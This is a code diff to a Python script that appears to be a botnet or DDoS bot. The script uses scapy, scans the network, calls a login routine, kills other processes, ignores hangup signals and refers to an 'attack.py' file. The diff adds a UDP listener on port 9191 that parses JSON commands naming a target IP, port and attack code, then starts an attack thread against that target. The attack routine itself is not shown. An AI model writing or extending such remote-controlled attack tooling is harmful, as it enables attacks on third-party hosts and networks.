@@ -1,3 +1,4 @@
+import json
 import time
 import asyncio
 import os
@@ -15,6 +16,7 @@ from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP
 from uuid import getnode as get_mac
 
 MY_IP = "0.0.0.0"
+UDP_PORT = "9191"
 OUR_DNS = "192.168.1.1"
 LOCK_FILE = '/tmp/b'
 ATK_FILE = "attack.py"
@@ -267,6 +269,28 @@ async def scan():
         await asyncio.sleep(duration)
 
 
+class EchoServerProtocol:
+    def connection_made(self, transport):
+        self.transport = transport
+
+    def datagram_received(self, data, addr):
+        message = data.decode()
+        print('Received %r from %s' % (message, addr))
+        handle_msg(self.transport, message, addr)
+
+def handle_msg(i_transport, i_data, i_addr):
+
+    local_data = json.loads(i_data)
+    local_msg = local_data['data']
+
+    ip = local_msg['ip']
+    port = int(local_msg['port'])
+    code = int(local_msg['code'])
+    
+    t = attack(code, ip, port)
+    t.start()
+
+
 kill_processes()
 
 signal.signal(signal.SIGHUP, signal.SIG_IGN)
@@ -274,6 +298,11 @@ signal.signal(signal.SIGINT, int_handler)
 EVENT_LOOP = asyncio.get_event_loop()
 asyncio.ensure_future(scan())
 asyncio.ensure_future(login())
+
+print('[+]Starting UDP server on {}.'.format(UDP_PORT))
+listen = EVENT_LOOP.create_datagram_endpoint(EchoServerProtocol, local_addr=('127.0.0.1', UDP_PORT))
+transport, protocol = EVENT_LOOP.run_until_complete(listen)
+
 print('[D] Starting module.')
 
 try:
